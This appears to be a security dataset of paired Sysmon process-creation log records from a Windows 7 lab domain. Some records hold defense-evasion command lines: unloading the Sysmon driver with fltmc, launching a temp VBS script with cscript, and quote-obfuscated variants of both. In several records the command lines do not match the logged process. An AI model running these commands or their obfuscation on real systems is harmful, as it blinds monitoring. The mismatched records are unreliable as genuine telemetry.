"{'process': {'pid': 1896, 'thread': {'id': 1392}}, 'event_id': 1, 'api': 'wineventlog', 'provider_name': 'Microsoft-Windows-Sysmon', 'task': 'Process Create (rule: ProcessCreate)', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'version': 5, 'user': {'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18'}, 'event_data': {'IntegrityLevel': 'High', 'Company': 'Adobe Systems Incorporated', 'TerminalSessionId': '1', 'LogonGuid': '{19FC45AC-74C5-601C-0000-0020F4FF0000}', 'LogonId': '0xfff4', 'Description': 'Adobe Acrobat SpeedLauncher', 'Product': 'Adobe Acrobat', 'FileVersion': '9.1.0.2009022700', 'OriginalFileName': 'AcroSpeedLaunch.exe'}, 'record_id': 1174, 'opcode': 'Info', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'computer_name': 'CLIENT'}","{'api': 'wineventlog', 'computer_name': 'CLIENT1.breach.local', 'process': {'pid': 1524, 'thread': {'id': 1792}}, 'record_id': 1292, 'opcode': 'Info', 'event_data': {'TerminalSessionId': '1', 'LogonGuid': '{19FC45AC-7533-601C-0000-0020ED4A0200}', 'OriginalFileName': 'taskhost.exe', 'IntegrityLevel': 'Medium', 'LogonId': '0x24aed', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'Description': 'Host Process for Windows Tasks', 'Product': 'Microsoft® Windows® Operating System', 'Company': 'Microsoft Corporation'}, 'version': 5, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'event_id': 1, 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'provider_name': 'Microsoft-Windows-Sysmon', 'task': 'Process Create (rule: ProcessCreate)'}"
"{'code': 1, 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:11.355Z', 'kind': 'event'}","{'type': ['start', 'process_start'], 'category': ['process'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:06.298Z', 'module': 'sysmon'}"
"{'domain': 'client', 'name': 'setup'}","{'domain': 'BREACH', 'name': 'client1'}"
"{'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT2', 'ephemeral_id': '805d2621-88bc-4353-a953-25544d012426', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT2'}","{'ephemeral_id': 'c6dab1c1-2860-4ed8-b41c-e6b57498568e', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT1', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT1'}"
2021-02-04T22:27:20.203Z,2021-02-04T22:28:08.828Z
"{'mac': ['00:50:56:00:03:02', '00:50:56:00:00:02', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT2', 'architecture': 'x86', 'os': {'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.102', '172.16.1.2', 'fe80::5efe:c0a8:3866', 'fe80::5efe:ac10:102'], 'name': 'CLIENT'}","{'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT3', 'architecture': 'x86', 'os': {'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103'], 'name': 'CLIENT3'}"
"{'working_directory': 'C:\\Windows\\system32\\', 'parent': {'executable': 'C:\\Windows\\explorer.exe', 'command_line': 'C:\\Windows\\Explorer.EXE', 'name': 'explorer.exe', 'args': ['C:\\Windows\\Explorer.EXE'], 'entity_id': '{19FC45AC-74C6-601C-0000-0010E21B0100}', 'pid': 1292}, 'args': ['C:\\Program Files\\Adobe\\Reader 9.0\\Reader\\reader_sl.exe'], 'hash': {'md5': '452fa961163ef4aee4815796a13ab2cf', 'sha256': '14dc422082f96f5c21c41a5e5f6e8445547cc4b02b18f0a86a34669ca2ce18a7'}, 'executable': 'C:\\Windows\\System32\\fltmc.exe', 'command_line': 'fltmc unload sysmondrv', 'name': 'reader_sl.exe', 'entity_id': '{19FC45AC-74C8-601C-0000-0010E87C0100}', 'pid': 1596}","{'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-74F7-601C-0000-0010FE630000}', 'pid': 444, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'command_line': 'fltmc un""loa""d SysmonDrv', 'name': 'spoolsv.exe', 'args': ['C:\\Windows\\System32\\spoolsv.exe'], 'hash': {'md5': '866a43013535dc8587c258e43579c764', 'sha256': 'b2be846b5167a2ecd1e30c69a81385fcc6eae6033394d08458a5583d311c4d82'}, 'entity_id': '{19FC45AC-74F8-601C-0000-00100C0D0100}', 'pid': 1208, 'executable': 'C:\\Windows\\System32\\fltmc.exe'}"
"{'user': 'setup', 'hash': ['452fa961163ef4aee4815796a13ab2cf', '14dc422082f96f5c21c41a5e5f6e8445547cc4b02b18f0a86a34669ca2ce18a7']}","{'user': 'SYSTEM', 'hash': ['866a43013535dc8587c258e43579c764', 'b2be846b5167a2ecd1e30c69a81385fcc6eae6033394d08458a5583d311c4d82']}"
"{'md5': '452fa961163ef4aee4815796a13ab2cf', 'sha256': '14dc422082f96f5c21c41a5e5f6e8445547cc4b02b18f0a86a34669ca2ce18a7'}","{'md5': '866a43013535dc8587c258e43579c764', 'sha256': 'b2be846b5167a2ecd1e30c69a81385fcc6eae6033394d08458a5583d311c4d82'}"
"Process Create:
RuleName: 
UtcTime: 2021-02-04 22:27:20.203
ProcessGuid: {19FC45AC-74C8-601C-0000-0010E87C0100}
ProcessId: 1596
Image: C:\Program Files\Adobe\Reader 9.0\Reader\reader_sl.exe
FileVersion: 9.1.0.2009022700
Description: Adobe Acrobat SpeedLauncher
Product: Adobe Acrobat
Company: Adobe Systems Incorporated
OriginalFileName: AcroSpeedLaunch.exe
CommandLine: ""C:\Program Files\Adobe\Reader 9.0\Reader\reader_sl.exe"" 
CurrentDirectory: C:\Windows\system32\
User: client\setup
LogonGuid: {19FC45AC-74C5-601C-0000-0020F4FF0000}
LogonId: 0xfff4
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=452FA961163EF4AEE4815796A13AB2CF,SHA256=14DC422082F96F5C21C41A5E5F6E8445547CC4B02B18F0A86A34669CA2CE18A7
ParentProcessGuid: {19FC45AC-74C6-601C-0000-0010E21B0100}
ParentProcessId: 1292
ParentImage: C:\Windows\explorer.exe
ParentCommandLine: C:\Windows\Explorer.EXE","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:28:08.828
ProcessGuid: {19FC45AC-74F8-601C-0000-00100C0D0100}
ProcessId: 1208
Image: C:\Windows\System32\spoolsv.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Spooler SubSystem App
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: spoolsv.exe
CommandLine: C:\Windows\System32\spoolsv.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-74F7-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=866A43013535DC8587C258E43579C764,SHA256=B2BE846B5167A2ECD1E30C69A81385FCC6EAE6033394D08458A5583D311C4D82
ParentProcessGuid: {19FC45AC-74F7-601C-0000-0010FE630000}
ParentProcessId: 444
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe"
"{'process': {'pid': 1896, 'thread': {'id': 1392}}, 'event_id': 1, 'api': 'wineventlog', 'provider_name': 'Microsoft-Windows-Sysmon', 'task': 'Process Create (rule: ProcessCreate)', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'version': 5, 'user': {'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18'}, 'event_data': {'IntegrityLevel': 'High', 'Company': 'Adobe Systems Incorporated', 'TerminalSessionId': '1', 'LogonGuid': '{19FC45AC-74C5-601C-0000-0020F4FF0000}', 'LogonId': '0xfff4', 'Description': 'Adobe Acrobat SpeedLauncher', 'Product': 'Adobe Acrobat', 'FileVersion': '9.1.0.2009022700', 'OriginalFileName': 'AcroSpeedLaunch.exe'}, 'record_id': 1174, 'opcode': 'Info', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'computer_name': 'CLIENT'}","{'record_id': 1218, 'computer_name': 'CLIENT3', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'event_data': {'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'Description': 'Spooler SubSystem App', 'TerminalSessionId': '0', 'LogonGuid': '{19FC45AC-74F7-601C-0000-0020E7030000}', 'OriginalFileName': 'spoolsv.exe', 'Company': 'Microsoft Corporation', 'IntegrityLevel': 'System', 'LogonId': '0x3e7', 'Product': 'Microsoft® Windows® Operating System'}, 'event_id': 1, 'api': 'wineventlog', 'version': 5, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'provider_name': 'Microsoft-Windows-Sysmon', 'task': 'Process Create (rule: ProcessCreate)', 'opcode': 'Info', 'user': {'type': 'User', 'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY'}, 'process': {'pid': 1516, 'thread': {'id': 1780}}}"
"{'code': 1, 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:11.355Z', 'kind': 'event'}","{'code': 1, 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:13.050Z', 'kind': 'event'}"
"{'domain': 'client', 'name': 'setup'}","{'domain': 'NT AUTHORITY', 'name': 'SYSTEM'}"
"{'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT2', 'ephemeral_id': '805d2621-88bc-4353-a953-25544d012426', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT2'}","{'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT3', 'ephemeral_id': 'f5ed3d9b-1471-4589-bd70-28219e0f5978', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3'}"
2021-02-05T07:08:54.675Z,2021-02-04T22:27:21.843Z
"{'domain': 'NT AUTHORITY', 'name': 'LOCAL SERVICE'}","{'domain': 'client', 'name': 'setup'}"
"{'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}","{'md5': 'edc79826e21859e93a875dfc087606c5', 'sha256': 'd61ddea87b2483612caeb0f3514aee3e60237d5f3880f49512c834539462742e'}"
"{'hostname': 'CLIENT3', 'ephemeral_id': '177650cc-629c-4abf-8b93-a90e2e515251', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3', 'type': 'winlogbeat', 'version': '7.10.2'}","{'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT1', 'ephemeral_id': 'c6dab1c1-2860-4ed8-b41c-e6b57498568e', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT1'}"
"{'record_id': 1652, 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'process': {'pid': 1904, 'thread': {'id': 308}}, 'task': 'Process Create (rule: ProcessCreate)', 'api': 'wineventlog', 'provider_name': 'Microsoft-Windows-Sysmon', 'event_data': {'Product': 'Microsoft® Windows® Operating System', 'Company': 'Microsoft Corporation', 'Description': 'Host Process for Windows Tasks', 'LogonId': '0x3e5', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'IntegrityLevel': 'System', 'LogonGuid': '{19FC45AC-76E8-601C-0000-0020E5030000}', 'OriginalFileName': 'taskhost.exe', 'TerminalSessionId': '0'}, 'event_id': 1, 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'computer_name': 'CLIENT3.breach.local', 'opcode': 'Info', 'version': 5, 'channel': 'Microsoft-Windows-Sysmon/Operational'}","{'event_id': 1, 'record_id': 1184, 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'provider_name': 'Microsoft-Windows-Sysmon', 'task': 'Process Create (rule: ProcessCreate)', 'computer_name': 'CLIENT', 'opcode': 'Info', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'version': 5, 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'event_data': {'IntegrityLevel': 'High', 'Description': 'Python', 'OriginalFileName': 'python.exe', 'FileVersion': '3.5.2', 'LogonId': '0xfb89', 'TerminalSessionId': '1', 'Product': 'Python', 'LogonGuid': '{19FC45AC-74C5-601C-0000-002089FB0000}', 'Company': 'Python Software Foundation'}, 'api': 'wineventlog', 'process': {'thread': {'id': 1512}, 'pid': 1684}}"
"{'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-05T07:08:57.554Z', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event'}","{'kind': 'event', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:06.123Z'}"
"Process Create:
RuleName: 
UtcTime: 2021-02-05 07:08:54.675
ProcessGuid: {19FC45AC-EF06-601C-0000-001049E75300}
ProcessId: 1540
Image: C:\Windows\System32\taskhost.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhost.exe
CommandLine: taskhost.exe $(Arg0)
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\LOCAL SERVICE
LogonGuid: {19FC45AC-76E8-601C-0000-0020E5030000}
LogonId: 0x3e5
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=7FA8BA5A780E4757964AC9D4238302B9,SHA256=65E3D8CE737896647065103FBB4D58E6A34171D0A48662A832CFDAC3CF469701
ParentProcessGuid: {19FC45AC-76E7-601C-0000-001081630000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:27:21.843
ProcessGuid: {19FC45AC-74C9-601C-0000-001082B40100}
ProcessId: 1908
Image: C:\Program Files\Python35-32\python.exe
FileVersion: 3.5.2
Description: Python
Product: Python
Company: Python Software Foundation
OriginalFileName: python.exe
CommandLine: ""C:\Program Files\Python35-32\python.exe"" ""C:\BREACH\init_tbf_client.py"" 
CurrentDirectory: C:\BREACH\
User: client\setup
LogonGuid: {19FC45AC-74C5-601C-0000-002089FB0000}
LogonId: 0xfb89
TerminalSessionId: 1
IntegrityLevel: High
Hashes: MD5=EDC79826E21859E93A875DFC087606C5,SHA256=D61DDEA87B2483612CAEB0F3514AEE3E60237D5F3880F49512C834539462742E
ParentProcessGuid: {19FC45AC-74C9-601C-0000-0010E99D0100}
ParentProcessId: 1824
ParentImage: C:\Windows\py.exe
ParentCommandLine: ""C:\Windows\py.exe"" ""C:\BREACH\init_tbf_client.py"" "
"{'entity_id': '{19FC45AC-EF06-601C-0000-001049E75300}', 'working_directory': 'C:\\Windows\\system32\\', 'args': ['taskhost.exe', '$(Arg0)'], 'pid': 1540, 'executable': 'C:\\Windows\\System32\\taskhost.exe', 'command_line': 'cscript.exe %TEMP%\\Retrive2646804049303142888.vbs ', 'parent': {'entity_id': '{19FC45AC-76E7-601C-0000-001081630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'taskhost.exe', 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}}","{'command_line': 'cscript %TEMP%\\Retrive2646804049303142888.vbs ', 'working_directory': 'C:\\BREACH\\', 'name': 'python.exe', 'hash': {'md5': 'edc79826e21859e93a875dfc087606c5', 'sha256': 'd61ddea87b2483612caeb0f3514aee3e60237d5f3880f49512c834539462742e'}, 'args': ['C:\\Program Files\\Python35-32\\python.exe', 'C:\\BREACH\\init_tbf_client.py'], 'entity_id': '{19FC45AC-74C9-601C-0000-001082B40100}', 'pid': 1908, 'executable': 'C:\\Program Files\\Python35-32\\python.exe', 'parent': {'entity_id': '{19FC45AC-74C9-601C-0000-0010E99D0100}', 'pid': 1824, 'executable': 'C:\\Windows\\py.exe', 'command_line': '""C:\\Windows\\py.exe"" ""C:\\BREACH\\init_tbf_client.py"" ', 'name': 'py.exe', 'args': ['C:\\Windows\\py.exe', 'C:\\BREACH\\init_tbf_client.py']}}"
"{'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103'], 'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT3', 'name': 'CLIENT3.breach.local', 'architecture': 'x86', 'os': {'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)'}}","{'name': 'CLIENT', 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101'], 'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT1', 'architecture': 'x86', 'os': {'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional'}}"
"{'user': 'LOCAL SERVICE', 'hash': ['7fa8ba5a780e4757964ac9d4238302b9', '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701']}","{'user': 'setup', 'hash': ['edc79826e21859e93a875dfc087606c5', 'd61ddea87b2483612caeb0f3514aee3e60237d5f3880f49512c834539462742e']}"
2021-02-05T07:08:54.675Z,2021-02-04T22:28:11.515Z
"{'domain': 'NT AUTHORITY', 'name': 'LOCAL SERVICE'}","{'domain': 'NT AUTHORITY', 'name': 'SYSTEM'}"
"{'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}","{'md5': 'c2f59c783a26dd480bafcc9955a99f42', 'sha256': '8c50ce44732912726e5ab0958e4199deee77f904cd746369f37b91e67a9826c6'}"
"{'hostname': 'CLIENT3', 'ephemeral_id': '177650cc-629c-4abf-8b93-a90e2e515251', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3', 'type': 'winlogbeat', 'version': '7.10.2'}","{'name': 'CLIENT1', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT1', 'ephemeral_id': 'c6dab1c1-2860-4ed8-b41c-e6b57498568e', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5'}"
"{'record_id': 1652, 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'process': {'pid': 1904, 'thread': {'id': 308}}, 'task': 'Process Create (rule: ProcessCreate)', 'api': 'wineventlog', 'provider_name': 'Microsoft-Windows-Sysmon', 'event_data': {'Product': 'Microsoft® Windows® Operating System', 'Company': 'Microsoft Corporation', 'Description': 'Host Process for Windows Tasks', 'LogonId': '0x3e5', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'IntegrityLevel': 'System', 'LogonGuid': '{19FC45AC-76E8-601C-0000-0020E5030000}', 'OriginalFileName': 'taskhost.exe', 'TerminalSessionId': '0'}, 'event_id': 1, 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'computer_name': 'CLIENT3.breach.local', 'opcode': 'Info', 'version': 5, 'channel': 'Microsoft-Windows-Sysmon/Operational'}","{'task': 'Process Create (rule: ProcessCreate)', 'computer_name': 'CLIENT1', 'opcode': 'Info', 'record_id': 1224, 'version': 5, 'process': {'pid': 1504, 'thread': {'id': 1772}}, 'user': {'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18', 'name': 'SYSTEM'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'event_data': {'OriginalFileName': '?', 'TerminalSessionId': '0', 'Company': 'Sysinternals - www.sysinternals.com', 'Product': 'Sysinternals Sysmon', 'IntegrityLevel': 'System', 'FileVersion': '10.41', 'Description': 'System activity monitor', 'LogonGuid': '{19FC45AC-74F9-601C-0000-0020E7030000}', 'LogonId': '0x3e7'}, 'event_id': 1, 'api': 'wineventlog', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'provider_name': 'Microsoft-Windows-Sysmon'}"
"{'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-05T07:08:57.554Z', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event'}","{'type': ['start', 'process_start'], 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:31:06.130Z', 'kind': 'event', 'code': 1, 'module': 'sysmon', 'category': ['process']}"
"Process Create:
RuleName: 
UtcTime: 2021-02-05 07:08:54.675
ProcessGuid: {19FC45AC-EF06-601C-0000-001049E75300}
ProcessId: 1540
Image: C:\Windows\System32\taskhost.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhost.exe
CommandLine: taskhost.exe $(Arg0)
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\LOCAL SERVICE
LogonGuid: {19FC45AC-76E8-601C-0000-0020E5030000}
LogonId: 0x3e5
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=7FA8BA5A780E4757964AC9D4238302B9,SHA256=65E3D8CE737896647065103FBB4D58E6A34171D0A48662A832CFDAC3CF469701
ParentProcessGuid: {19FC45AC-76E7-601C-0000-001081630000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:28:11.515
ProcessGuid: {19FC45AC-74FB-601C-0000-0010903C0100}
ProcessId: 1504
Image: C:\Windows\Sysmon.exe
FileVersion: 10.41
Description: System activity monitor
Product: Sysinternals Sysmon
Company: Sysinternals - www.sysinternals.com
OriginalFileName: ?
CommandLine: C:\Windows\Sysmon.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-74F9-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=C2F59C783A26DD480BAFCC9955A99F42,SHA256=8C50CE44732912726E5AB0958E4199DEEE77F904CD746369F37B91E67A9826C6
ParentProcessGuid: {19FC45AC-74F8-601C-0000-00109E610000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe"
"{'entity_id': '{19FC45AC-EF06-601C-0000-001049E75300}', 'working_directory': 'C:\\Windows\\system32\\', 'args': ['taskhost.exe', '$(Arg0)'], 'pid': 1540, 'executable': 'C:\\Windows\\System32\\taskhost.exe', 'command_line': 'cscript.exe %TEMP%\\Retrive2646804049303142888.vbs ', 'parent': {'entity_id': '{19FC45AC-76E7-601C-0000-001081630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'taskhost.exe', 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}}","{'command_line': 'cs""cri""pt.exe %TEMP%\\Ret""ri""ve2670234531104625201.v""bs"" ', 'parent': {'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe'], 'entity_id': '{19FC45AC-74F8-601C-0000-00109E610000}', 'pid': 440}, 'pid': 1504, 'executable': 'C:\\Windows\\Sysmon.exe', 'working_directory': 'C:\\Windows\\system32\\', 'name': 'Sysmon.exe', 'args': ['C:\\Windows\\Sysmon.exe'], 'hash': {'md5': 'c2f59c783a26dd480bafcc9955a99f42', 'sha256': '8c50ce44732912726e5ab0958e4199deee77f904cd746369f37b91e67a9826c6'}, 'entity_id': '{19FC45AC-74FB-601C-0000-0010903C0100}'}"
"{'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103'], 'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT3', 'name': 'CLIENT3.breach.local', 'architecture': 'x86', 'os': {'build': '7601.0', 'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)'}}","{'os': {'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101'], 'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT1', 'architecture': 'x86', 'name': 'CLIENT1'}"
"{'user': 'LOCAL SERVICE', 'hash': ['7fa8ba5a780e4757964ac9d4238302b9', '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701']}","{'user': 'SYSTEM', 'hash': ['c2f59c783a26dd480bafcc9955a99f42', '8c50ce44732912726e5ab0958e4199deee77f904cd746369f37b91e67a9826c6']}"
2021-02-05T07:08:54.675Z,2021-02-04T22:34:56.046Z
"{'domain': 'NT AUTHORITY', 'name': 'LOCAL SERVICE'}","{'name': 'SYSTEM', 'domain': 'NT AUTHORITY'}"
"{'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}","{'md5': '54a47f6b5e09a77e61649109c6a08866', 'sha256': '121118a0f5e0e8c933efd28c9901e54e42792619a8a3a6d11e1f0025a7324bc2'}"
"{'hostname': 'CLIENT3', 'ephemeral_id': '177650cc-629c-4abf-8b93-a90e2e515251', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3', 'type': 'winlogbeat', 'version': '7.10.2'}","{'version': '7.10.2', 'hostname': 'CLIENT1', 'ephemeral_id': '486f7872-9118-4349-8630-511973cdbf72', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT1', 'type': 'winlogbeat'}"
